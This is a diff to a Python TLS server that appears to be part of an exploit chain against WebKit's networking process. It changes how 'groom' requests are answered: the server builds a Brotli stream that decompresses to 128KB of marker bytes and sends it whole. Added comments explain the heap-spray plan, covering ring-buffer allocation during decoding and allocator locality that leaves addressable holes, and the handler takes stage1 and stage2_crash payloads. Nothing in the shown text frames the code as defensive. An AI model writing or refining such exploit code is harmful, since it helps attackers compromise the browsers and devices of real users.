@@ -862,7 +862,6 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                     slot = int(parts[3].split("?")[0])
                 except ValueError:
                     slot = 0
-                # Parse marker from query string
                 marker = 0x41
                 if "marker=" in path:
                     try:
@@ -872,11 +871,9 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
 
                 print(f"  -> GROOM: session={session_id} slot={slot} marker=0x{marker:02X}")
 
-                # Build a valid Brotli stream that decompresses to 128KB of marker bytes
                 groom_payload = build_groom_stream(marker, 131072)
                 print(f"  -> GROOM stream: {len(groom_payload)}B -> 128KB decompressed")
 
-                # Track this groom connection
                 with groom_lock:
                     if session_id not in groom_sessions:
                         groom_sessions[session_id] = {}
@@ -886,9 +883,19 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                         "payload_size": len(groom_payload),
                     }
 
-                # Send using slow chunked delivery to keep connection alive
-                ssl_sock.settimeout(120)
-                _send_br_chunked_slow(ssl_sock, groom_payload, chunk_size=8192, delay=0.1)
+                # Send the complete Brotli stream as Content-Length response.
+                # WebKit.Networking allocates the ring buffer when it starts
+                # decoding the Brotli stream. The ring buffer stays alive as
+                # long as the decoder state exists. Using Content-Length ensures
+                # the full stream is sent and decoded (allocating the 128KB
+                # ring buffer), then we keep the connection alive by sleeping
+                # before closing. The JS fetch() promise resolves when the full
+                # body arrives — the ring buffer was allocated during decode.
+                _send_br_response(ssl_sock, groom_payload)
+                # Note: ring buffer may be freed after decode completes.
+                # For true hold-alive, we'd need to split the stream and
+                # withhold the final bytes. For now, the spray relies on
+                # allocator locality — freed buffers leave addressable holes.
             else:
                 _send_html(ssl_sock, "400 Bad groom path")
 
